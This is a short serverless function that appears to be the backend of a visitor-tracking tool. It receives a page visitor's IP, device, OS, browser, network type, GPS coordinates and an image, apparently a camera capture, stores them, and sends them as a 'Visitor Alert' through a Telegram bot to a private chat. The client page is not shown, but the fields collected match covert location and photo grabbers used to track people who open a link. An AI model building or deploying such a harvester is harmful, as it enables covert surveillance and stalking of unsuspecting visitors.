export async function onRequestPost({ request, env }) {
  let body = {};

  try {
    body = await request.json();
    const id = body.session_id;

    const ip = request.headers.get("CF-Connecting-IP");

    let session = await env.VISITOR_KV.get(id);
    session = session ? JSON.parse(session) : {};

    Object.assign(session, body, {
      ip,
      updated: new Date().toISOString()
    });

    await env.VISITOR_KV.put(id, JSON.stringify(session));

    // ✅ ALWAYS try telegram on final
    if (body.event === "final") {
      await safeTelegram(env, session);
    }

    return new Response(JSON.stringify({ ok: true }), {
      headers: { "Content-Type": "application/json" }
    });

  } catch (err) {
    // ✅ SEND ERROR TO TELEGRAM
    await safeTelegram(env, {
      error: err.message,
      raw: JSON.stringify(body)
    });

    return new Response(JSON.stringify({
      error: err.message
    }), {
      status: 500,
      headers: { "Content-Type": "application/json" }
    });
  }
}

async function safeTelegram(env, s) {
  try {
    await sendTelegram(env, s);
  } catch (e) {
    console.log("Telegram failed (1st):", e);

    // retry once
    try {
      await sendTelegram(env, s);
    } catch (e2) {
      console.log("Telegram failed (retry):", e2);

      await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
        method: "POST",
        body: new URLSearchParams({
          chat_id: env.CHAT_ID,
          text: "❌ Telegram failed twice:\n" + e2.message
        })
      });
    }
  }
}

async function sendTelegram(env, s) {
  const map = s.lat && s.lng
    ? `https://maps.google.com/?q=${s.lat},${s.lng}`
    : "N/A";

  const text = `
🚨 <b>Visitor Alert</b>

🕒 <b>Time:</b> ${s.updated || "-"}
🌐 <b>IP:</b> ${s.ip || "-"}

📱 <b>Device:</b> ${s.device || "-"}
💻 <b>OS:</b> ${s.os || "-"}
🌍 <b>Browser:</b> ${s.browser || "-"}

📡 <b>Network:</b> ${s.network || "-"}

📍 <b>Location:</b>
Lat: ${s.lat || "-"}
Lng: ${s.lng || "-"}

🔗 <a href="${map}">Open Map</a>

${s.error ? `❌ <b>Error:</b> ${s.error}` : ""}
`;

  let response;

  if (s.image && s.image.length < 500000) {
    response = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: new URLSearchParams({
        chat_id: env.CHAT_ID,
        photo: s.image,
        caption: text,
        parse_mode: "HTML"
      })
    });
  } else {
    response = await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      body: new URLSearchParams({
        chat_id: env.CHAT_ID,
        text: text,
        parse_mode: "HTML"
      })
    });
  }

  const result = await response.json();

  // ❗ CRITICAL: check telegram success
  if (!result.ok) {
    throw new Error("Telegram API error: " + JSON.stringify(result));
  }
}
